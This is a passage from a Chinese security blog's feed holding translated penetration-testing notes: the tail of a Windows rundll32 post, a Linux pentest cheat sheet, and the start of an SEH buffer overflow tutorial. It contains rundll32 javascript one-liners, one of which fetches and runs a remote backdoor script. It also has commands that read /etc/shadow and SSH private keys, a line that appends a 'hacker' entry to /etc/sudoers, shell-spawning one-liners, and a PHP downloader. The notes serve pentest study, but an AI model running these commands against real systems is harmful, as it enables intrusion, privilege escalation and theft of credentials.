&quot;;eval(&quot;w=new%20ActiveXObject(\&quot;WScript.Shell\&quot;);w.run(\&quot;calc\&quot;);window.close()&quot;);</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;)</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 翻译文章 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Notes</title>
      <link href="/2019/10/11/Linux%20Notes/"/>
      <url>/2019/10/11/Linux%20Notes/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文是翻译文章：记录在渗透测试过程中，经常会使用的Linux命令。</p><p>原文地址：<a href="https://m0chan.github.io/2018/07/31/Linux-Notes-And-Cheatsheet.html" target="_blank" rel="noopener">https://m0chan.github.io/2018/07/31/Linux-Notes-And-Cheatsheet.html</a></p><a id="more"></a><h1 id="0x01-列举"><a href="#0x01-列举" class="headerlink" title="0x01 列举"></a>0x01 列举</h1><h2 id="1-1-基本命令"><a href="#1-1-基本命令" class="headerlink" title="1.1 基本命令"></a>1.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">hostname </span><br><span class="line">uname -a</span><br><span class="line">cat /etc/password</span><br><span class="line">cat /etc/shadow</span><br><span class="line">groups</span><br><span class="line">ifconfig</span><br><span class="line">netstat -an</span><br><span class="line">ps aux | grep root</span><br><span class="line">uname -a</span><br><span class="line">env</span><br><span class="line">id</span><br><span class="line">cat /proc/version</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/group</span><br><span class="line">cat /etc/shadow</span><br><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure><h2 id="1-2-侦察"><a href="#1-2-侦察" class="headerlink" title="1.2 侦察"></a>1.2 侦察</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">秘密的扫毛系统开放的端口</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYN洪泛扫描</span></span><br><span class="line">nmap -sS INSERTIPADDRESS</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全端口扫描</span></span><br><span class="line">nmap INSERTIPADDRESS -p-</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务版本，默认脚本，操作系统探测</span></span><br><span class="line">nmap INSERTIPADDRESS -sV -sC -O -p 111,222,333</span><br><span class="line"></span><br><span class="line"><span class="comment">#UDP扫描</span></span><br><span class="line">nmap INSERTIPADDRESS -sU</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用UDP的方式连接开放的端口</span></span><br><span class="line">nc -u INSERTIPADDRESS 48772</span><br></pre></td></tr></table></figure><h2 id="1-3-UDP扫描"><a href="#1-3-UDP扫描" class="headerlink" title="1.3 UDP扫描"></a>1.3 UDP扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udpprotocolscanner &lt;ip&gt;</span><br></pre></td></tr></table></figure><h2 id="1-4-FTP枚举"><a href="#1-4-FTP枚举" class="headerlink" title="1.4 FTP枚举"></a>1.4 FTP枚举</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS</span><br></pre></td></tr></table></figure><h2 id="1-5-启动Web服务器"><a href="#1-5-启动Web服务器" class="headerlink" title="1.5 启动Web服务器"></a>1.5 启动Web服务器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><h1 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h1><p>libSSH身份验证绕过-CVE-2018-10933</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/blacknbunny/libSSH-Authentication-Bypass</span><br><span class="line"></span><br><span class="line">Use nc &lt;ip&gt; 22 to banner grab the SSH Service, if it&apos;s running vulnerable version of libSSH then you can bypass</span><br></pre></td></tr></table></figure><h1 id="0x03-特权提升"><a href="#0x03-特权提升" class="headerlink" title="0x03 特权提升"></a>0x03 特权提升</h1><h2 id="3-1-基本命令"><a href="#3-1-基本命令" class="headerlink" title="3.1 基本命令"></a>3.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version &lt;- Check for kernel exploits</span><br><span class="line">ps auxww</span><br><span class="line">ps -ef</span><br><span class="line">lsof -i</span><br><span class="line">netstat -laputen</span><br><span class="line">arp -e</span><br><span class="line">route</span><br><span class="line">cat /sbin/ifconfig -a</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/networks</span><br><span class="line">iptables -L</span><br><span class="line">hostname</span><br><span class="line">dnsdomainname</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz-</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><h2 id="3-2-运行pspy64"><a href="#3-2-运行pspy64" class="headerlink" title="3.2 运行pspy64"></a>3.2 运行pspy64</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/DominicBreuker/pspy</span><br><span class="line"></span><br><span class="line">Run in background and watch for any processes running</span><br></pre></td></tr></table></figure><h2 id="3-3-生成TTY"><a href="#3-3-生成TTY" class="headerlink" title="3.3 生成TTY"></a>3.3 生成TTY</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</span><br><span class="line"></span><br><span class="line">python -c &apos;import pty; pty.spawn(&quot;/bin/sh&quot;)&apos;</span><br><span class="line">echo os.system(&apos;/bin/bash&apos;)</span><br><span class="line">awk &apos;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&apos;</span><br><span class="line">find / -name blahblah &apos;exec /bin/awk &apos;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&apos; \;</span><br><span class="line">python: exit_code = os.system(&apos;/bin/sh&apos;) output = os.popen(&apos;/bin/sh&apos;).read()</span><br><span class="line">perl -e &apos;exec &quot;/bin/sh&quot;;&apos;</span><br><span class="line">perl: exec &quot;/bin/sh&quot;;</span><br><span class="line">ruby: exec &quot;/bin/sh&quot;</span><br><span class="line">lua: os.execute(&apos;/bin/sh&apos;)</span><br><span class="line">irb(main:001:0&gt; exec &quot;/bin/sh&quot;</span><br><span class="line">Can also use socat</span><br></pre></td></tr></table></figure><h2 id="3-4-枚举脚本"><a href="#3-4-枚举脚本" class="headerlink" title="3.4 枚举脚本"></a>3.4 枚举脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /EscalationServer/</span><br><span class="line">chmod u+x linux_enum.sh</span><br><span class="line">chmod 700 linuxenum.py</span><br><span class="line"></span><br><span class="line">./linux_enum.sh</span><br><span class="line">python linuxenum.py</span><br></pre></td></tr></table></figure><h2 id="3-5-将用户添加到Sudoers"><a href="#3-5-将用户添加到Sudoers" class="headerlink" title="3.5 将用户添加到Sudoers"></a>3.5 将用户添加到Sudoers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;hacker ALL=(ALL:ALL) ALL&quot; &gt;&gt; /etc/sudoers</span><br></pre></td></tr></table></figure><h2 id="3-6-列出CronJobs"><a href="#3-6-列出CronJobs" class="headerlink" title="3.6 列出CronJobs"></a>3.6 列出CronJobs</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure><h2 id="3-7-检查SSH可读SSH密钥的持久性和提升"><a href="#3-7-检查SSH可读SSH密钥的持久性和提升" class="headerlink" title="3.7 检查SSH可读SSH密钥的持久性和提升"></a>3.7 检查SSH可读SSH密钥的持久性和提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/authorized_keys</span><br><span class="line">cat ~/.ssh/identity.pub</span><br><span class="line">cat ~/.ssh/identity</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">cat ~/.ssh/id_rsa</span><br><span class="line">cat ~/.ssh/id_dsa.pub</span><br><span class="line">cat ~/.ssh/id_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br></pre></td></tr></table></figure><h2 id="3-8-启动脚本"><a href="#3-8-启动脚本" class="headerlink" title="3.8 启动脚本"></a>3.8 启动脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -o+w -type f 2&gt;/dev/null | grep -v &apos;/proc\|/dev&apos;</span><br></pre></td></tr></table></figure><h2 id="3-9-查找用户或组的可写文件"><a href="#3-9-查找用户或组的可写文件" class="headerlink" title="3.9 查找用户或组的可写文件"></a>3.9 查找用户或组的可写文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / perm /u=w -user `whoami` 2&gt;/dev/null</span><br><span class="line">find / -perm /u+w,g+w -f -user `whoami` 2&gt;/dev/null</span><br><span class="line">find / -perm /u+w -user `whoami` 2&gt;/dev/nul</span><br></pre></td></tr></table></figure><h2 id="3-10-查找用户或组的可写目录"><a href="#3-10-查找用户或组的可写目录" class="headerlink" title="3.10 查找用户或组的可写目录"></a>3.10 查找用户或组的可写目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / perm /u=w -type -d -user `whoami` 2&gt;/dev/null</span><br><span class="line">find / -perm /u+w,g+w -d -user `whoami` 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="3-11-嗅探流量"><a href="#3-11-嗅探流量" class="headerlink" title="3.11 嗅探流量"></a>3.11 嗅探流量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 &lt;protocol&gt;</span><br><span class="line">tcpdump -i any -s0 -w capture.pcap</span><br><span class="line">tcpdump -i eth0 -w capture -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X</span><br><span class="line">tcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X</span><br></pre></td></tr></table></figure><h2 id="3-12-用户安装的软件（有时配置错误）"><a href="#3-12-用户安装的软件（有时配置错误）" class="headerlink" title="3.12 用户安装的软件（有时配置错误）"></a>3.12 用户安装的软件（有时配置错误）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/</span><br><span class="line">/usr/local/src</span><br><span class="line">/usr/local/bin</span><br><span class="line">/opt/</span><br><span class="line">/home</span><br><span class="line">/var/</span><br><span class="line">/usr/src/</span><br></pre></td></tr></table></figure><h1 id="0x04-exploit"><a href="#0x04-exploit" class="headerlink" title="0x04 exploit"></a>0x04 exploit</h1><h2 id="4-1-获得权限"><a href="#4-1-获得权限" class="headerlink" title="4.1 获得权限"></a>4.1 获得权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="4-2-获取SUID二进制文件"><a href="#4-2-获取SUID二进制文件" class="headerlink" title="4.2 获取SUID二进制文件"></a>4.2 获取SUID二进制文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="4-3-检查Sudo配置"><a href="#4-3-检查Sudo配置" class="headerlink" title="4.3 检查Sudo配置"></a>4.3 检查Sudo配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><h1 id="0x05-文件传输"><a href="#0x05-文件传输" class="headerlink" title="0x05 文件传输"></a>0x05 文件传输</h1><h2 id="5-1-base64"><a href="#5-1-base64" class="headerlink" title="5.1 base64"></a>5.1 base64</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat file.transfer | base64 -w 0 </span><br><span class="line">echo base64blob | base64 -d &gt; file.transfer</span><br></pre></td></tr></table></figure><h2 id="5-2-curl"><a href="#5-2-curl" class="headerlink" title="5.2 curl"></a>5.2 curl</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://webserver/file.txt &gt; output.txt</span><br></pre></td></tr></table></figure><h2 id="5-3-wget"><a href="#5-3-wget" class="headerlink" title="5.3 wget"></a>5.3 wget</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://webserver/file.txt &gt; output.txt</span><br></pre></td></tr></table></figure><h2 id="5-4-FTP"><a href="#5-4-FTP" class="headerlink" title="5.4 FTP"></a>5.4 FTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyftpdlib</span><br><span class="line">python -m pyftpdlib -p 21 -w</span><br></pre></td></tr></table></figure><h2 id="5-5-TFTP"><a href="#5-5-TFTP" class="headerlink" title="5.5 TFTP"></a>5.5 TFTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">service atftpd start</span><br><span class="line">atftpd --daemon --port 69 /tftp</span><br><span class="line">/etc/init.d/atftpd restart</span><br><span class="line">auxiliary/server/tftp</span><br></pre></td></tr></table></figure><h2 id="5-6-NC-Listeners"><a href="#5-6-NC-Listeners" class="headerlink" title="5.6 NC Listeners"></a>5.6 NC Listeners</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 443 &lt; filetotransfer.txt</span><br><span class="line">nc &lt;ip&gt; 443 &gt; filetransfer.txt</span><br></pre></td></tr></table></figure><h2 id="5-7-PHP-File-Transfers"><a href="#5-7-PHP-File-Transfers" class="headerlink" title="5.7 PHP File Transfers"></a>5.7 PHP File Transfers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php file_put_contents(&apos;nameOfFile&apos;, fopen(&apos;http://192.168.1.102/file&apos;, &apos;r&apos;)); ?&gt;&quot; &gt; down2.php</span><br></pre></td></tr></table></figure><h2 id="5-8-SCP"><a href="#5-8-SCP" class="headerlink" title="5.8 SCP"></a>5.8 SCP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Copy a file:</span><br><span class="line">scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext</span><br><span class="line"></span><br><span class="line"># Copy a directory:</span><br><span class="line">scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination</span><br></pre></td></tr></table></figure><h1 id="0x06-横向渗透"><a href="#0x06-横向渗透" class="headerlink" title="0x06 横向渗透"></a>0x06 横向渗透</h1><h2 id="6-1-SSH本地端口转发"><a href="#6-1-SSH本地端口转发" class="headerlink" title="6.1 SSH本地端口转发"></a>6.1 SSH本地端口转发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &lt;user&gt;@&lt;target&gt; -L 127.0.0.1:8888:&lt;targetip&gt;:&lt;targetport&gt;</span><br></pre></td></tr></table></figure><h2 id="6-2-SSH动态端口转发"><a href="#6-2-SSH动态端口转发" class="headerlink" title="6.2 SSH动态端口转发"></a>6.2 SSH动态端口转发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -D &lt;localport&gt; user@host</span><br><span class="line">nano /etc/proxychains.conf</span><br><span class="line">127.0.0.1 &lt;localport&gt;</span><br></pre></td></tr></table></figure><h2 id="6-3-索卡特港口前进"><a href="#6-3-索卡特港口前进" class="headerlink" title="6.3 索卡特港口前进"></a>6.3 索卡特港口前进</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./socat tcp-listen:5000,reuseaddr,fork tcp:&lt;target ip&gt;:5001</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win32缓冲区溢出-SEH溢出和Egghunters</title>
      <link href="/2019/10/11/Win32%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-SEH%E6%BA%A2%E5%87%BA%E5%92%8CEgghunters/"/>
      <url>/2019/10/11/Win32%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-SEH%E6%BA%A2%E5%87%BA%E5%92%8CEgghunters/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这是一篇翻译的文章，出自<a href="https://m0chan.github.io/2019/08/21/Win32-Buffer-Overflow-SEH.html，本作者只做翻译工作，版权为原作者所有，如有侵权，请联系删除。" target="_blank" rel="noopener">https://m0chan.github.io/2019/08/21/Win32-Buffer-Overflow-SEH.html，本作者只做翻译工作，版权为原作者所有，如有侵权，请联系删除。</a></p><a id="more"></a><h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><h2 id="1-1-异常处理程序101"><a href="#1-1-异常处理程序101" class="headerlink" title="1.1 异常处理程序101"></a>1.1 异常处理程序101</h2><p>在从漏洞利用的角度出发进行研究之前，让我们首先讨论一下<strong>异常处理程序的</strong> <em>真正</em>含义，不同的类型以及它们在Windows OS中的服务目的。</p><h3 id="1-1-1-什么是例外？"><a href="#1-1-1-什么是例外？" class="headerlink" title="1.1.1 什么是例外？"></a>1.1.1 什么是例外？</h3><p><em>异常是在程序/功能执行期间发生的事件</em></p><h3 id="1-1-2-不同类型的处理程序"><a href="#1-1-2-不同类型的处理程序" class="headerlink" title="1.1.2 不同类型的处理程序"></a>1.1.2 不同类型的处理程序</h3><p><strong>异常处理程序（EH）</strong> -一段代码，将尝试<em>执行某项操作，</em>并根据结果选择预定义的课程。例如，如果失败，请尝试执行此操作。</p><p><strong>结构化异常处理程序（SEH）-</strong> Windows内置的异常处理程序，如果开发特定的异常处理程序失败或主要使用，则可用于回退。</p><p><strong>下一个结构化异常处理程序（nSEH）-</strong></p><p>现在，如您在上面看到的，我<strong>确实</strong>提到了<strong>EH / SEH，</strong>因为<strong>异常处理程序</strong>分为两个不同的类别，即<em>OS级别</em>处理程序和/或由开发人员自己实现的处理程序。如您所见，Windows具有一个称为<strong>SEH</strong>的<em>操作系统级别</em>。</p><p>因此，基本上，<strong>异常处理程序</strong>是程序内部编写的代码段，其唯一目的是处理应用程序可能引发的任何<em>异常</em>或错误。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">    // Code to try goes here.</span><br><span class="line">&#125;</span><br><span class="line">catch (SomeSpecificException ex)</span><br><span class="line">&#123;</span><br><span class="line">    // Code to handle the exception goes here.</span><br><span class="line">&#125;</span><br><span class="line">finally</span><br><span class="line">&#123;</span><br><span class="line">    // Code to execute after the try (and possibly catch) blocks </span><br><span class="line">    // goes here.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的例子代表了一个基本的异常处理程序<strong>（EH）</strong>在<code>C#</code>由开发人员实现-有时候看着像上面的代码可以是相当吓人非程序员，但所有我们真正做的是说<code>try</code>运行这段代码：如果有错误/无论<code>catch</code>块包含什么内容，都将发生异常。简单！</p><p>现在，对于软件开发人员来说，编写自己的异常处理程序来管理软件可能遇到的任何错误/警告并不少见，但是<strong>Windows</strong>还内置了一个称为<strong>结构化异常处理程序（SEH）的程序</strong>，它可以抛出诸如以下的错误消息<code>Program.exe has stopped working and needs to close</code>：确保您之前都看过它们。</p><p>还值得一提的是，无论在<strong>OS级别</strong>和/或<strong>开发人员级别</strong>定义了<strong>异常处理**</strong>程序<strong>，</strong>Windows SEH都会<strong>通过一组指定的内存位置和<em>功能</em>对所有</strong>处理程序<strong>进行集中和一致的控制和管理，无论是在</strong>操作系统级别<strong>和/或</strong>开发人员级别。**。</p><h3 id="1-1-3-那么结构化异常处理程序如何工作？"><a href="#1-1-3-那么结构化异常处理程序如何工作？" class="headerlink" title="1.1.3 那么结构化异常处理程序如何工作？"></a>1.1.3 那么结构化异常处理程序如何工作？</h3><p>那么，它们如何工作？SEH井是Windows中的一种机制，它利用称为<strong>链接列表</strong>的数据结构/布局来包含一系列存储位置。触发异常后，操作系统将检索<strong>SEH链</strong>的头部并遍历列表，处理程序将评估最相关的操作过程，以正常关闭程序或执行指定的操作以从<em>异常中</em>恢复。（更多有关链接的信息）</p><p>当我们运行一个应用程序时，将执行该应用程序，并从<em>该应用程序</em>内部运行每个<strong>功能</strong>，都会创建一个<strong>堆栈帧</strong>，然后在该函数<em>返回</em>或完成执行后最终<strong>弹出</strong>该<strong>堆栈帧</strong>。现在对于<strong>异常处理程序</strong>实际上同样如此。基本上，如果你运行一个函数具有<strong>异常处理程序</strong>嵌入itself-该异常处理程序将获得它自己的专用<strong>堆栈帧</strong></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161604.png" class="lozad"></p><p><em>资料来源：ethicalhacker.net</em></p><p>如您所见，每个<strong>代码块</strong>都有自己的<strong>堆栈框架</strong>，由链接每个相应<em>框架</em>的箭头表示。</p><p>那么……它们是如何联系的？对每个<strong>异常处理程序来说</strong>，都有一个配置的<strong>异常注册记录</strong>，这些<strong>记录</strong>都链接在一起形成一个链表。该<strong>异常注册记录</strong>中包含众多领域，但即<code>_EXCEPTION_REGISTRATION_RECORD *Next;</code>它定义的下一个<strong>异常注册记录</strong>在<strong>SEH链</strong> -这是什么使我们过导航<strong>SEH链</strong>从<em>顶部至底部</em>。</p><p>现在，您可能想知道<strong>Windows SEH</strong>如何使用<strong>异常注册记录</strong>和<strong>处理程序</strong>等。当发生异常时，操作系统将从<strong>SEH链</strong>的顶部启动，并检查第一个<strong>异常注册记录</strong>以查看它是否可以处理异常/错误，如果可以，它将执行指向<strong>异常处理程序</strong>的指针定义的代码块-但是，如果不能，它将使用字段移至下<strong>一条*</strong>记录，<em>并沿*</em>SEH链*<em>向下<code>_EXCEPTION_REGISTRATION_RECORD *Next;</code>移动，并继续执行因此一直沿链向下，直到找到能够处理异常的</em>记录/处理程序*。</p><p>但是，如果没有预定义的异常处理程序功能适用，该怎么办？良好的窗口在每个<strong>SEH链</strong>的底部放置了一个默认/通用异常处理程序，它可以提供如下通用消息<code>Your program has stopped responding and needs to close</code>：通用处理程序在上图中由表示<code>0xffffff</code></p><p>下图提供了整个<strong>SEH链</strong>的简化概述</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161629.png" class="lozad"></p><p>我们还可以通过加载二进制文件并<strong>单击</strong>来查看具有<strong>免疫性</strong>的<strong>SEH链</strong><code>Alt+S</code> -如您在下图中所看到的，我们的<strong>SEH链</strong>在左下角以绿色突出显示，而<strong>SEH Record / SEH Handler</strong>在屏幕上以蓝色突出显示。堆。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161624.png" class="lozad"></p><p>在这种情况下，我们实际上有2个由<strong>SEH Records</strong>指定的处理程序-第一个是正常实现的处理程序，而第二个是地址<code>0028FFC4</code>的Window的<strong>OS Level</strong>处理程序，我们可以在下面的屏幕快照中看到。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161640.png" class="lozad"></p><h3 id="1-1-4-漏洞"><a 